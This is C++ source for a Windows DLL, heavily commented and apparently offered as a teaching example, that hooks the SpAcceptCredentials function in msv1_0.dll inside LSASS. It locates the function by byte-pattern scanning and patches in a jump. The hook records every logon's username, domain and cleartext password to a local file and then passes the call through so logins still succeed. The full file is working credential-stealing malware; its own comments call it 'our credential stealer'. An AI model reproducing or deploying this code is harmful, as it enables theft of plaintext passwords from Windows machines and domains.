// Standard I/O operations for debugging and output
#include <iostream>
// Windows API functions, types, and structures
#include <Windows.h>
// std::memcpy() for safe memory copying operations
#include <cstring>
// Enable 32-bit security definitions (required before Sspi.h)
#define SECURITY_WIN32
// Security Support Provider Interface - provides authentication structures
#include <Sspi.h>
// NT Security API - defines SECURITY_LOGON_TYPE, UNICODE_STRING, etc.
#include <ntsecapi.h>
// NT Security Package API - provides credential structures
#include <ntsecpkg.h>

// Function pointer type definition for SpAcceptCredentials
// NTAPI = __stdcall calling convention on x64, matches original function signature
using _SpAcceptCredentials = NTSTATUS(NTAPI *)(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName, PSECPKG_PRIMARY_CRED PrimaryCredentials, PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials);

// Byte pattern signature for SpAcceptCredentials function prologue
// Assembly: sub rsp,32; mov rbx,r9; mov rdi,r8; mov esi,ecx; (part of next instruction)
// This pattern identifies the beginning of the SpAcceptCredentials function in memory
char startOfPatternSpAccecptedCredentials[] = { 0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xd9, 0x49, 0x8b, 0xf8, 0x8b, 0xf1, 0x48 };

// Hook assembly code template: "mov rax, <64-bit-address>; jmp rax"
// 0x48, 0xb8 = "mov rax, <64-bit-value>" instruction
// Remaining 10 bytes will be filled with address and jump instruction
char bytesToPatchSpAccecptedCredentials[12] = { 0x48, 0xb8 };

// Global variables to store addresses and backup data
PVOID patternStartAddressOfSpAccecptedCredentials = NULL;  // Address where pattern was found
PVOID addressOfSpAcceptCredentials = NULL;                 // Actual function entry point (pattern - 16)
char bytesToRestoreSpAccecptedCredentials[12] = { 0 };     // Backup of original function bytes

// Forward declaration of hook installation function
void installSpAccecptedCredentialsHook();

// Pattern scanning function to find byte signatures in memory
// This is a linear search algorithm that looks for a specific byte pattern
// Used to locate the SpAcceptCredentials function in msv1_0.dll memory
PVOID GetPatternMemoryAddress(char *startAddress, char *pattern, SIZE_T patternSize, SIZE_T searchBytes)
{
	unsigned int index = 0;                    // Current position in memory
	PVOID patternAddress = NULL;               // Address where pattern was found
	char *patternByte = 0;                     // Current byte from pattern
	char *memoryByte = 0;                      // Current byte from memory
	
	// Linear scan through memory
	do
	{
		// Check if first byte of pattern matches current memory position
		if (startAddress[index] == pattern[0])
		{
			// If first byte matches, check remaining bytes
			for (size_t i = 1; i < patternSize; i++)
			{
				// Get current bytes for comparison
				*(char *)&patternByte = pattern[i];
				*(char *)&memoryByte = startAddress[index + i];

				// If any byte doesn't match, break and continue searching
				if (patternByte != memoryByte)
				{
					break;
				}

				// If we've checked all bytes and they all match, we found the pattern
				if (i == patternSize - 1)
				{
					patternAddress = (LPVOID)(&startAddress[index]);
					return patternAddress;
				}
			}
		}
		++index;  // Move to next byte in memory
	} while (index < searchBytes);  // Continue until we've searched the entire range

	return (PVOID)NULL;  // Pattern not found
}

// Hook function that intercepts SpAcceptCredentials calls
// This function has the EXACT same signature as the original SpAcceptCredentials
// When Windows calls SpAcceptCredentials, our hook executes instead
// The parameters are automatically passed to us due to x64 calling convention
NTSTATUS NTAPI hookedSpAccecptedCredentials(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName, PSECPKG_PRIMARY_CRED PrimaryCredentials, PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials)
{
	DWORD bytesWritten = 0;  // Bytes written counter for file operations
	
	// Create file to store captured credentials
	// GENERIC_ALL = full access, CREATE_ALWAYS = overwrite if exists
	HANDLE file = CreateFileW(L"c:\\temp\\credentials.txt", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, NULL, NULL);
	if (file == INVALID_HANDLE_VALUE) {
		// If file creation fails, just call original function and exit
		// This ensures the system continues to work even if our hook fails
		_SpAcceptCredentials originalSpAcceptCredentials = (_SpAcceptCredentials)addressOfSpAcceptCredentials;
		return originalSpAcceptCredentials(LogonType, AccountName, PrimaryCredentials, SupplementalCredentials);
	}
	
	// Cast the raw address to a callable function pointer
	// This allows us to call the original SpAcceptCredentials function
	_SpAcceptCredentials originalSpAcceptCredentials = (_SpAcceptCredentials)addressOfSpAcceptCredentials;

	// Intercept and write credentials to disk in format: username@domain:password
	// DownlevelName = username (e.g., "Administrator")
	WriteFile(file, PrimaryCredentials->DownlevelName.Buffer, PrimaryCredentials->DownlevelName.Length, &bytesWritten, NULL);
	WriteFile(file, "@", 2, &bytesWritten, NULL);  // Separator between username and domain
	// DomainName = domain (e.g., "WORKGROUP" or "CORP.LOCAL")
	WriteFile(file, PrimaryCredentials->DomainName.Buffer, PrimaryCredentials->DomainName.Length, &bytesWritten, NULL);
	WriteFile(file, ":", 2, &bytesWritten, NULL);  // Separator between domain and password
	// Password = clear text password (this is why this technique is dangerous!)
	WriteFile(file, PrimaryCredentials->Password.Buffer, PrimaryCredentials->Password.Length, &bytesWritten, NULL);
	CloseHandle(file);

	// Temporarily restore the original SpAcceptCredentials function
	// This prevents infinite recursion and allows the original function to execute
	WriteProcessMemory(GetCurrentProcess(), addressOfSpAcceptCredentials, bytesToRestoreSpAccecptedCredentials, sizeof(bytesToRestoreSpAccecptedCredentials), NULL);

	// Create a new thread to reinstall the hook after a delay
	// The delay allows the original function to complete execution
	// Without this delay, we'd create an infinite loop
	CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)installSpAccecptedCredentialsHook, NULL, NULL, NULL);
	
	// Call the original SpAcceptCredentials function with the same parameters
	// This ensures the user can still log in successfully
	// The system expects this function to complete normally
	return originalSpAcceptCredentials(LogonType, AccountName, PrimaryCredentials, SupplementalCredentials);
}

// Main hook installation function
// This function finds SpAcceptCredentials in memory and installs our hook
void installSpAccecptedCredentialsHook()
{
	// 5-second delay to allow original function to complete execution
	// This prevents race conditions during hook/unhook cycles
	Sleep(1000 * 5);
	
	// Get handle to msv1_0.dll (preferred over LoadLibrary)
	// GetModuleHandle returns handle to already-loaded module
	HMODULE targetModule = GetModuleHandleA("msv1_0.dll");
	if (!targetModule) {
		// Fallback to LoadLibrary if GetModuleHandle fails
		// This should rarely happen since msv1_0.dll is always loaded in LSASS
		targetModule = LoadLibraryA("msv1_0.dll");
	}
	DWORD bytesWritten = 0;  // Bytes written counter for WriteProcessMemory

	// Parse PE (Portable Executable) headers to get DLL size
	// DOS header is at the very beginning of the DLL
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)targetModule;
	// NT header is located at DOS header + e_lfanew offset
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)targetModule + dosHeader->e_lfanew);
	// SizeOfImage tells us the total size of the DLL in memory
	// This is the boundary for our pattern scanning
	SIZE_T sizeOfImage = ntHeader->OptionalHeader.SizeOfImage;

	// Find the address of SpAcceptCredentials using pattern scanning
	// We scan from the start of msv1_0.dll to its end (SizeOfImage)
	patternStartAddressOfSpAccecptedCredentials = (LPVOID)(DWORD_PTR)GetPatternMemoryAddress((char *)targetModule, startOfPatternSpAccecptedCredentials, sizeof(startOfPatternSpAccecptedCredentials), sizeOfImage);
	if (!patternStartAddressOfSpAccecptedCredentials) {
		// Pattern not found - function signature may have changed
		// This could happen on different Windows versions
		return;
	}
	
	// Calculate the actual function entry point
	// The pattern we found is 16 bytes INTO the function
	// So we subtract 16 to get the function start address
	addressOfSpAcceptCredentials = (LPVOID)((DWORD_PTR)patternStartAddressOfSpAccecptedCredentials - 16);

	// Backup the first 12 bytes of the original SpAcceptCredentials function
	// We'll restore these bytes later to temporarily "unhook" the function
	// This allows the original function to execute normally
	std::memcpy(bytesToRestoreSpAccecptedCredentials, addressOfSpAcceptCredentials, sizeof(bytesToRestoreSpAccecptedCredentials));
	
	// Build the hook assembly code: "mov rax, <hook-address>; jmp rax"
	// Get the address of our hook function
	DWORD_PTR addressBytesOfhookedSpAccecptedCredentials = (DWORD_PTR)&hookedSpAccecptedCredentials;
	// Insert the 64-bit address after the "mov rax" instruction (position 2)
	std::memcpy(bytesToPatchSpAccecptedCredentials + 2, &addressBytesOfhookedSpAccecptedCredentials, sizeof(&addressBytesOfhookedSpAccecptedCredentials));
	// Insert "jmp rax" instruction (0xff 0xe0) after the address (position 10)
	std::memcpy(bytesToPatchSpAccecptedCredentials + 2 + sizeof(&addressBytesOfhookedSpAccecptedCredentials), (PVOID)&"\xff\xe0", 2);
	
	// Write the hook assembly to the SpAcceptCredentials function entry point
	// This replaces the original function prologue with our hook code
	WriteProcessMemory(GetCurrentProcess(), addressOfSpAcceptCredentials, bytesToPatchSpAccecptedCredentials, sizeof(bytesToPatchSpAccecptedCredentials), (SIZE_T*)&bytesWritten);
}

// DLL entry point - called by Windows when the DLL is loaded/unloaded
// This is where we initialize our credential stealer
BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
		case DLL_PROCESS_ATTACH:
		{
			// DLL is being loaded into a process (in this case, lsass.exe)
			// This is where we start our credential stealing operation
			installSpAccecptedCredentialsHook();
			break;
		}
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
			// We don't need to handle these events for our credential stealer
			break;
	}
	return TRUE;  // Return TRUE to indicate successful DLL initialization
}